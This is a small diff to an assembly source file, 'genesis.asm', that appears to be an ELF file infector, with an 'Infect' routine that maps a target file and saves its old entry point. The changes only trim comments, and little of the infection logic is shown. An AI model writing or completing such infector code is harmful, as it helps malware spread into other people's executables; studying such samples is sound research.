@@ -5,13 +5,6 @@
 ; nasm -f elf64 genesis.asm -o genesis.o
 ; ld genesis.o -o genesis
 
-; Note: Because I'm weird I decided to use camelCase for 
-;       constants and macros. Jokes aside, for this I wanted
-;       to experiment by approaching ASM like an high-level
-;       language, thus making it *hopefully* more readable
-;       for people that are less familiar with ASM.
-;
-
 %include "src/Macros.asm"
 %include "src/Structs.asm"
 
@@ -177,11 +170,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   test    rax,  rax                                 ; check if mmap(...) failed
   js      .InfectFailureExit
 
-  push    rax                                       ; rsp         -> FileMap (ELF-HDR)
-                                                    ; rsp + 0x8   -> FileSz
-                                                    ; rsp + 0x10  -> Old Entry
-                                                    ; rsp + 0x18  -> Program Hdr
-                                                    ; rsp + 0x20  -> EOF
+  push    rax
 
   ;; SAVE OLD ENTRY >-------------------------------------------------------<
   
